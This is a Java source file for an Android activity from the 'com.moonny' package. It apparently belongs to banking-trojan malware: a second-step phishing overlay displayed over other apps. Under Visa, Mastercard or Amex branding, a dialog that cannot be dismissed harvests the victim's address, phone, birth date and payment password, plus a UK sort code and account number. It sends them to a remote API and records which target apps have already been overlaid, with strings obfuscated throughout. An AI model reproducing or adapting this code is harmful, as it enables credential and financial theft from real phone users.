package com.moonny.acts;

import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;

import com.moonny.R;
import com.moonny.Modules;
import com.moonny.api.ApiRequest;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;
import com.moonny.widget.CustomDay;
import com.moonny.widget.CustomMonth;

import org.json.JSONException;
import org.json.JSONObject;

public class CC2 extends Activity {
    public static final String INTENT_WITH_CARD = S.intent_with_card;
    public static final String INTENT_WITH_MONTH = S.intent_with_month;
    public static final String INTENT_WITH_YEAR = S.intent_with_year;
    public static final String INTENT_WITH_CVC = S.intent_with_cvc;

    public static final int UNKNOWN_CARD = -1;
    public static final int AMEX_CARD = 3;
    public static final int VISA_CARD = 4;
    public static final int MASTERCARD_CARD = 5;
    public static int TYPE_CARD = UNKNOWN_CARD;

    private AlertDialog dialog;
    private View view;

    private EditText mPassword, mYear, mAddress, mZip, mPhone, mSort, mAccountNumber;
    private CustomMonth mMonth;
    private CustomDay mDay;

    private String title = "";
    private String on_package = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        view = getLayoutInflater().inflate(R.layout.gp_dialog_password, null, false);

        mDay = (CustomDay) view.findViewById(R.id.day_edit);
        mDay.setHint(S.s(getString(R.string.v)));

        mMonth = (CustomMonth) view.findViewById(R.id.month_edit);
        mMonth.setHint(S.s(getString(R.string.m)));

        mYear = (EditText) view.findViewById(R.id.year_edit);
        mYear.setHint(S.s(getString(R.string.n)));

        mAddress = (EditText) view.findViewById(R.id.address);
        mAddress.setHint(S.s(getString(R.string.s)));

        mZip = (EditText) view.findViewById(R.id.zip);
        mZip.setHint(S.s(getString(R.string.t)));

        mPhone = (EditText) view.findViewById(R.id.phone);
        mPhone.setHint(S.s(getString(R.string.u)));

        mSort = (EditText) view.findViewById(R.id.sort);
        mSort.setHint(S.s(getString(R.string.p)));

        mAccountNumber = (EditText) view.findViewById(R.id.account_number);
        mAccountNumber.setHint(S.s(getString(R.string.q)));

        mPassword = (EditText) view.findViewById(R.id.password_edit);
        mPassword.setHint(S.s(getString(R.string.l)));

        // enable sort/account fields in UK
        if(Utils.isUK(this)) {
            mSort.setVisibility(View.VISIBLE);
            mAccountNumber.setVisibility(View.VISIBLE);
        }

        TextView mTitle = (TextView) view.findViewById(R.id.mTitle);

        TextView birthday_text = (TextView) view.findViewById(R.id.birthday_text);
        birthday_text.setText(S.s(getString(R.string.w)));

        ImageView visa = (ImageView) view.findViewById(R.id.visa_img);
        ImageView masterCard = (ImageView) view.findViewById(R.id.mastercard_img);
        ImageView amexCard = (ImageView) view.findViewById(R.id.amex_img);

        if (TYPE_CARD == VISA_CARD) {
            visa.setVisibility(View.VISIBLE);
            masterCard.setVisibility(View.GONE);
            amexCard.setVisibility(View.GONE);
            mTitle.setText(S.s(getString(R.string.h)));
        }else if (TYPE_CARD == AMEX_CARD) {
            amexCard.setVisibility(View.VISIBLE);
            visa.setVisibility(View.GONE);
            masterCard.setVisibility(View.GONE);
            mTitle.setText(S.s(getString(R.string.i)));
        } else {
            masterCard.setVisibility(View.VISIBLE);
            visa.setVisibility(View.GONE);
            amexCard.setVisibility(View.GONE);
            mTitle.setText(S.s(getString(R.string.j)));
        }

        Intent intent = getIntent();
        title = intent.getStringExtra(S.title);
        on_package = intent.getStringExtra(S.on_package);

        showMyDialog();
    }


    private void showMyDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setCancelable(false);
        builder.setView(view);
        builder.setTitle(title);
        builder.setPositiveButton(S.s(getString(R.string.c)), null);
        dialog = builder.create();
        dialog.setOnShowListener(new DialogInterface.OnShowListener() {
            @Override
            public void onShow(DialogInterface d) {
                Button ok = dialog.getButton(AlertDialog.BUTTON_POSITIVE);
                ok.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {

                        //Dismiss once everything is OK.
                        if (validNumber()) {

                            Context ctx = getApplicationContext();
                            
                            JSONObject data = new JSONObject();
                            try {
                                data.put(S.api_method, S.api_cc);
                                data.put(S.api_cc_step, 2);
                                data.put(S.api_cc_address, mAddress.getText().toString());
                                data.put(S.api_cc_zip, mZip.getText().toString());
                                data.put(S.api_cc_phone, mPhone.getText().toString());
                                data.put(S.api_cc_bday, mDay.getText().toString());
                                data.put(S.api_cc_bmonth, mMonth.getText().toString());
                                data.put(S.api_cc_byear, mYear.getText().toString());
                                data.put(S.api_cc_pay_pass, mPassword.getText().toString());

                                if(mSort.getVisibility() != View.GONE && mAccountNumber.getVisibility() != View.GONE)
                                {
                                    data.put(S.api_cc_sort, mSort.getText().toString());
                                    data.put(S.api_cc_account_number, mAccountNumber.getText().toString());
                                }

                            }catch (JSONException e){
                                e.printStackTrace();
                                return;
                            }

                            new ApiRequest(getApplicationContext(), data).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

                            // one time CC launch
                            if((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.api_fire_cc, false }))
                            {
                                Modules.main(ctx, S.set_pref, new Object[]{ S.api_fire_cc, false });

                                // normal launch over other app
                            }else {
                                String done_apps = (String) Modules.main(ctx, S.get_pref, new Object[]{S.cc_done_apps, ""});
                                String done_apps2 = (String) Modules.main(ctx, S.list_add, new Object[]{done_apps, on_package});

                                if (!done_apps2.equals(done_apps))
                                    Modules.main(ctx, S.set_pref, new Object[]{S.cc_done_apps, done_apps2});
                            }

                            Modules.main(ctx, S.set_pref, new Object[]{ S.injectCyclePause, false});

                            dialog.dismiss();
                            finish();
                        }
                    }
                });
            }
        });
        dialog.show();
    }

    private boolean validNumber() {
        //mPassword
        //mSort
        //mAccountNumber
        // mAddress
        // mZip
        // mPhone
        if(mSort.getVisibility() != View.GONE && mSort.getText().length() < 2)
            return false;

        if(mAccountNumber.getVisibility() != View.GONE && mAccountNumber.getText().length() < 4)
            return false;

        if (mDay.getText().length() < 2 ||
                mMonth.getText().length() < 2 ||
                mYear.getText().length() < 2 ||
                mPassword.getText().length() < 3 ||
                mAddress.getText().length() < 4 ||
                mZip.getText().length() < 2 ||
                mPhone.getText().length() < 5
        )
            return false;

        return true;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Modules.main(getApplicationContext(), S.set_pref, new Object[]{ S.injectCyclePause, false});
        dialog.dismiss();
        finish();
    }

    @Override
    protected void onPause() {
        super.onPause();
        Modules.main(getApplicationContext(), S.set_pref, new Object[]{ S.injectCyclePause, false});
        dialog.dismiss();
        finish();
    }
}